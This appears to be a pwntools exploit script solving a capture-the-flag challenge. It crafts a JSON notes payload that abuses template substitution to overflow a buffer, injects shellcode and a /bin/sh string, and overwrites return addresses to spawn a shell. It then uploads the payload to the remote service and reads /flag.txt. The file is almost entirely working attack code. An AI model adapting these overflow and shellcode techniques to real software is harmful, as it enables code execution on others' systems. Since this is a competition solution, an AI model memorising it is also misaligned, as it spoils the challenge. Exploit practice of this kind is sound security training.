#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337
from pwn import *
import json
import shutil
from subprocess import check_output, run
from tempfile import TemporaryDirectory
from pathlib import Path
import re

# Set up pwntools for the correct architecture
context.update(arch="amd64")
# Obviously no guarantie that this is the same binary that gets compiled when we launch the challenge
exe = context.binary = ELF(args.EXE or "challenge")
host = args.HOST or "localhost"
port = int(args.PORT or 1337)

# Find flag by exact match
# log.success(find_flag(io.recvall()))
real_flag = open("./flag.txt", "r").readline().strip()
fake_flag = open("./flag-fake.txt", "r").readline().strip()


def find_flag(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    if fake_flag in output:
        return fake_flag
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None


# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")


def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
IN_SUB_A_ADDRESS = 0x1005853
BINSH_ADDRESS = 0x100593F
HANDLE_NULLBYTES_IN_ADDRESS = 0x1424242
gdbscript = f"""
b*{IN_SUB_A_ADDRESS}
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

payload = {
    "size": 0,
    "entries": [],
    "enable_substitutions": True,
    "substitutions": {},
}


def add_note(n):
    payload["entries"].append(n)
    payload["size"] += 1


def add_substitution(key, value):
    payload["substitutions"][key] = value


offset = cyclic_find(0x6161617763616161, n=8)

nopslide = asm("xor r9,r9;nop").decode() * 0x40
shellcode = asm("""
    pop rax
    pop rdi
    pop rsi
    pop rdx
    pop rdx
    pop rdx
    pop rdx
    pop rdx
    pop rdx
    syscall
""")
shellcode_as_utf8 = shellcode.decode()
add_substitution("A", nopslide + shellcode_as_utf8)

binsh = " " * 0x50 + "/bin/sh"
add_substitution("B", binsh)

add_note(
    {
        "title": "dummy",
        "content": "@A@@B@",
    }
)


add_substitution(
    "1",
    "B" * offset + "C" * 0x18 + "\u0000",
)

add_note(
    {
        "title": "B" * (0x100 - 1 - 3) + "@1@",
        "content": "asdf",
    }
)

add_substitution(
    "C",
    "B" * offset + "C" * 0x17 + "\u0000",
)

for i in range(0, 7):
    add_note(
        {
            "title": "B" * (0x100 - 1 - 3 - i) + "@C@",
            "content": "asdf",
        }
    )

add_substitution(
    "S",
    "B" * offset + "C" * 0x10 + p64(HANDLE_NULLBYTES_IN_ADDRESS).decode(),
)

add_note(
    {
        "title": "B" * (0x100 - 1 - 3) + "@S@",
        "content": "asdf",
    }
)

add_substitution(
    "2",
    "B" * offset + "C" * 0x10 + p64(BINSH_ADDRESS).decode(),
)

add_note(
    {
        "title": "B" * (0x100 - 1 - 3) + "@2@",
        "content": "asdf",
    }
)

for i in range(8, 0xF):
    add_note(
        {
            "title": "B" * (0x100 - 1 - 3 - i) + "@C@",
            "content": "asdf",
        }
    )

add_substitution(
    "3",
    "B" * offset + "C" * 0x8 + p64(59).decode(),
)
add_note(
    {
        "title": "B" * (0x100 - 1 - 3) + "@3@",
        "content": "asdf",
    }
)

for i in range(0x10, 0x17):
    add_note(
        {
            "title": "B" * (0x100 - 1 - 3 - i) + "@C@",
            "content": "asdf",
        }
    )

add_substitution(
    "N",
    "B" * offset + p64(HANDLE_NULLBYTES_IN_ADDRESS).decode(),
)

add_note(
    {
        "title": "B" * (0x100 - 1 - 3) + "@N@",
        "content": "asdf",
    }
)

add_substitution(
    "4",
    "B" * offset + p64(IN_SUB_A_ADDRESS).decode(),
)
add_note(
    {
        "title": "B" * (0x100 - 1 - 3) + "@4@",
        "content": "asdf",
    }
)


# add_substitution("5", cyclic(0x1000, n=8).decode())

with open("payload.json", "wb") as f:
    f.write(json.dumps(payload).encode())

if args.LOCAL and args.BUILD:
    with TemporaryDirectory() as d:
        dir = Path(d) / "challenge"
        shutil.copytree("../challenge", dir)
        shutil.copy("payload.json", dir / "src" / "notes.json")

        _ = check_output(["zig", "build"], cwd=dir)
        shutil.copy(dir / "zig-out" / "bin" / "challenge", "./challenge")

if args.LOCAL:
    exe = context.binary = ELF("./challenge")
    io = start()
else:
    base64 = check_output(
        "tar cz payload.json | base64",
        shell=True,
    )

    io = start()
    io.sendafter(b"--- BASE64 INPUT START ---\n", base64 + b"@")
    io.readuntil(b"Build")
    if b"failed" in io.readline():
        exit(1)

    if args.COPY:
        io.sendlineafter("📝\n".encode(), b"Y")
        b64 = io.readuntil(b"[>]")[0:-3]
        with open("challenge.b64", "wb") as f:
            f.write(b64)

        run(
            "cat challenge.b64 | base64 -d 2>/dev/null | tar -xzO > challenge 2>/dev/null",
            shell=True,
        )
    else:
        io.sendlineafter("📝\n".encode(), b"N")

io.sendline(b"list")

if not args.INTERACTIVE:
    io.sendline(b"cat /flag.txt")
    f = find_flag(io.recvall(timeout=4))
    if f is not None:
        log.success(f)
        exit(0)
    else:
        # Remember to return nonzero if something failed
        exit(1)

io.interactive()
